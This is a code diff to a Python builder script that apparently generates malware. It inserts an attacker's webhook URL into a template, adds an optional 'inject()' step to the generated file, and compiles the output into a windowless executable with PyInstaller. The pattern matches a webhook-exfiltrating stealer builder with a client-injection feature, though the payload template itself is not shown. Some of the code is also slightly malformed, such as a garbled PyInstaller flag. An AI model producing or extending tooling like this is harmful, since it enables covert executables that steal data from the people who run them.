@@ -26,8 +26,12 @@ __________
     print(Fore.YELLOW + f"Creating {filename}.py with '{webhook}' as webhook..." + Style.RESET_ALL)
     
     with open(f"{filename}.py", "w", encoding="utf-8") as f:
-        f.write(raw.replace("&WEBHOOK_URL&", webhook))
-        
+        inject = str(input(Fore.CYAN + "Add Injection? (y/n): " + Style.RESET_ALL))
+        if inject == 'y' or inject == 'Y':
+            f.write(raw.replace("&WEBHOOK_URL&", webhook).replace("# inject()", "inject()"))
+        else:
+            f.write(raw.replace("&WEBHOOK_URL&", webhook))
+            
     print(Fore.GREEN + "Done!" + Style.RESET_ALL)
     
     compile = str(input(Fore.CYAN + "Compile? (y/n): " + Style.RESET_ALL))
@@ -39,10 +43,6 @@ __________
         os.system("pip install -r requirements.txt")
         
         os.system(f"python -m PyInstaller --onefile --noconsole c--distpath ./ .\{filename}.py")
-        
-        for clean in [
-            os.system()
-        ]:
         
         input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)
         exit()
